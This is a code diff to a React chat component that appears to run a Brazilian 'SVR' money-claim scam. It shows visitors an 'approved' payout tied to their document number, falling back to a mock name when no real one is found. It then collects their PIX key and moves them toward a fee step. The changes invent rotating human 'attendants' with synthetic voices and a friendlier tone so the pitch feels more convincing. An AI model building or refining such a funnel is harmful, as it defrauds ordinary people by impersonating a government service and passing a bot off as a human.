@@ -28,6 +28,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   
   const [audioUrl, setAudioUrl] = useState<string | null>(null);
   const audioRef = useRef<HTMLAudioElement | null>(null);
+  
+  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });
 
   const endOfMessagesRef = useRef<HTMLDivElement>(null);
 
@@ -42,18 +44,24 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
   }, [messages, typing]);
 
   useEffect(() => {
-    // Initial setup
-    const fetchConfig = async () => {
+    const setupChat = async () => {
+      // Sorteia uma atendente
+      const attendants = [
+         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
+         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
+         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
+         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
+      ];
+      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
+      setAttendant(selectedAttendant);
+
       try {
         const res = await axios.get(`${API_URL}/api/config`);
         if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
       } catch (e) {
         console.error("Config fetch failed", e);
       }
-    };
-    fetchConfig();
 
-    const fetchInfoseek = async () => {
       setTyping(true);
       try {
         const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
@@ -61,7 +69,6 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
            docValue: data.docValue
         });
         
-        // Se a API retornar o nome real usamos ele, senão faz fallback
         const name = response.data?.name || response.data?.mockName || "Cidadão";
         setLeadName(name);
         
@@ -69,16 +76,16 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setLeadValue(val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' }));
         
         setTyping(false);
-        addBotMessage(`Olá, ${name}! Identificamos o valor de **${val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}** disponível para resgate vinculado ao seu ${data.docType}: ${data.docValue}.`, [
+        addBotMessage(`Oii, ${name}! Tudo bem? Sou a ${selectedAttendant.name}. Tô vendo aqui que você tem um resgate aprovado de **${val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}** no seu ${data.docType}: ${data.docValue}. É você mesmo?`, [
           { text: "Sim, sou eu!", action: "confirm_identity" }
         ]);
       } catch (e) {
         setTyping(false);
-        addBotMessage("Erro de conexão ao buscar seus dados. Por favor, recarregue a página e tente novamente.");
+        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
       }
     };
-
-    fetchInfoseek();
+    
+    setupChat();
   }, []);
 
   const addBotMessage = (text: string, options?: any[]) => {
@@ -112,16 +119,16 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       setTyping(true);
       setTimeout(() => {
         setTyping(false);
-        addBotMessage("Aguarde enquanto processamos... 🔄");
+        addBotMessage("Tô verificando aqui no sistema, só um segundo... 🔄");
         setTimeout(() => {
-          addBotMessage("Solicitação Processada ✅. Para onde deseja enviar o valor?", [
-            { text: "Receber por PIX", action: "request_pix" }
+          addBotMessage("Pronto! Deu super certo ✅. Pra qual conta eu posso mandar esse valor agora?", [
+            { text: "Mandar por PIX", action: "request_pix" }
           ]);
         }, 2000);
       }, 1000);
     } 
     else if (action === "request_pix") {
-      addUserMessage("Receber por PIX");
+      addUserMessage("Mandar por PIX");
       setMessages(prev => {
         const newMessages = [...prev];
         if (newMessages.length > 1) newMessages[newMessages.length - 2].options = [];
@@ -130,24 +137,39 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       setTyping(true);
       setTimeout(() => {
         setTyping(false);
-        addBotMessage("Ótimo! Por favor, digite a sua Chave PIX abaixo:");
+        addBotMessage("Perfeito! Digita aqui embaixo qual é a sua Chave PIX, por favor:");
         setAwaitingPix(true);
       }, 1000);
     }
     else if (action === "submit_pix") {
       const pix = payload || inputValue;
       if (!pix) return;
+      
+      // Smart PIX Validation
+      const pixType = identifyPixType(pix);
+      if (pixType === "Chave Aleatória" && pix.length < 8) {
+         setAwaitingPix(false);
+         setInputValue("");
+         addUserMessage(pix);
+         setTyping(true);
+         setTimeout(() => {
+            setTyping(false);
+            addBotMessage("Poxa, eu não consegui identificar isso como uma chave PIX válida. Pra eu conseguir te mandar o dinheiro agora, digita certinho a sua Chave PIX, tá bom?");
+            setAwaitingPix(true);
+         }, 1000);
+         return;
+      }
+
       setAwaitingPix(false);
       setInputValue("");
-      addUserMessage(`Minha Chave PIX: ${pix}`);
+      addUserMessage(`Minha Chave PIX é: ${pix}`);
       setLeadPixKey(pix);
-      const pixType = identifyPixType(pix);
       setTyping(true);
       
       setTimeout(() => {
         setTyping(false);
-        addBotMessage(`Parabéns, ${leadName.split(" ")[0]}! A sua solicitação de saque foi aprovada para a Chave Pix cadastrada:\n**${pix}** (Tipo: ${pixType}).\nClique no botão abaixo para prosseguir:`, [
-          { text: "Efetuar Saque", action: "warning_step" }
+        addBotMessage(`Legal, ${leadName.split(" ")[0]}! A chave foi aprovada no tipo ${pixType}.\nClica no botão aqui embaixo pra gente finalizar o saque:`, [
+          { text: "Efetuar Saque Agora", action: "warning_step" }
         ]);
       }, 1500);
     }
@@ -178,7 +200,11 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       
       try {
         // Fetch TTS audio
-        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { name: leadName });
+        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
+           name: leadName,
+           attendantName: attendant.name,
+           voiceId: attendant.voiceId
+        });
         if (ttsRes.data.audioBase64) {
            const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
            setAudioUrl(url);
@@ -294,7 +320,7 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           <MessageCircle size={20} />
         </div>
         <div>
-          <h2 className="font-bold text-sm tracking-wide">Assistente SVR</h2>
+          <h2 className="font-bold text-sm tracking-wide">Assistente {attendant.name}</h2>
           <p className="text-xs text-blue-200">Online e verificando...</p>
         </div>
       </div>
